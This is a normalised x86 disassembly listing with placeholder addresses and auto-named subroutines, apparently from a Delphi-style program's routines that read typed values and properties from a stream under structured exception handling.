mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c60c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40277c
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c5ec
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41e03c
call sub_40277c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403368
sub_41c66c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c752
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e1dc
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41c726
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c757
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c60c
pop ecx
test al al
jne r-xdata
call sub_403b98
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403b44
sub_41c77c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c7f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403564
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_418260
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c7f9
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c60c
pop ecx
test al al
jne r-xdata
call sub_403b98
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403b44
sub_41c81c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c897
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e1dc
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403564
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c8c0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41cae1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41db6c
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41db6c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41cab1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41ca6f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c50c
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c584
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c66c
pop ecx
push ebp
call sub_41c81c
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41c77c
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403bc8
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c584
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c584
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cae8
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40544c
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403564
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4188fc
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c4d0
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418744
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c4d0
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418744
sub_41ca74
push ebp
call sub_41c5ec
pop ecx
test al al
je r-xdata
call sub_403b44
call sub_403b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403368
sub_41cafc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cb6c
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41cb57
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cb6c
mov eax [ ebp - 0x4 ]
call sub_41c0bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c200
retn
sub_41cb6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bfa4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d074
mov eax [ ebp - 0x4 ]
call sub_41cf10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403564
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41cc2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403564
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bfa4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c8c0
mov eax [ ebp - 0x4 ]
call sub_41cf10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc35
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41cc3c
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41dd48
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cec4
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41c30c
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41cc80
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41dd48
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cec4
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c30c
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41ccc4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41dd48
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cec4
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c30c
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41cd14
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41dd48
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41cec4
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c30c
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41cd58
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41dd48
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41bde4
mov al [ eax + lookup_table_41cd7f ]
jmp [ eax * 4 + jump_table_41cd8d ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c30c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404254
mov eax esi
call j_sub_404630#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c30c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4041b8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4041b8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4041b8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4041b8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41ce58
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41dd48
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c30c
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41c30c
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c30c
jmp r-xdata
jmp r-xdata
call sub_41bde4
sub_41cec4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c2e8
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41ce58
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41dd48
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c30c
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41cf18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41c2e8
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41dd48
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41ce58
mov [ edi ] eax
sub_41cf58
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41d049
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404164
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4041fc
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d050
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4032b8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4043c8
sub_41d074
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d244
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_40395c#7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41db6c
xor edx edx
push ebp
push j_sub_40395c#9
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404424
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404684
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403590
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414c60
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403590
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414c60
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d3f8
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c2f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c2f8
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414d54
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41d058
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d24b
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov edi ebx
jmp r-xdata
sub_41d254
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_418108
mov ebx eax
test ebx ebx
je r-xdata
call sub_41bde4
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414dc8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d29c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b878
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418744
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d2dc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d32b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e460
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4155e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d332
lea eax [ ebp - 0x10 ]
call sub_40f18c
retn
sub_41d338
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41d3ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c2e8
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41cd58
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b878
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418744
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41dd48
lea eax [ ebp - 0x4 ]
call sub_405b04
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415784
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3f1
lea eax [ ebp - 0x8 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
sub_41d3f8
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d6f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d6fa
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x24 ]
call sub_404844
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404188
retn
jmp [ eax * 4 + jump_table_41d488 ]
mov eax [ rw-data ]
call sub_41bdcc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414d54
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2e8
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c3a8
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414dc8
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41cd58
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_414bfc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414dc8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc3c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41539c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41dba8
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41509c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41dc64
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4151b0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41da8c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414dc8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2e8
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2e8
cmp al 0xd
jne r-xdata
push ebp
call sub_41d2dc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cec4
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4156c8
jmp r-xdata
push ebp
call sub_41d338
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414d54
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ce58
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414dc8
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cd58
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d254
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd48
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414dc8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41cd58
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd48
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415668
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd48
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414d54
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c400
jmp r-xdata
jmp r-xdata
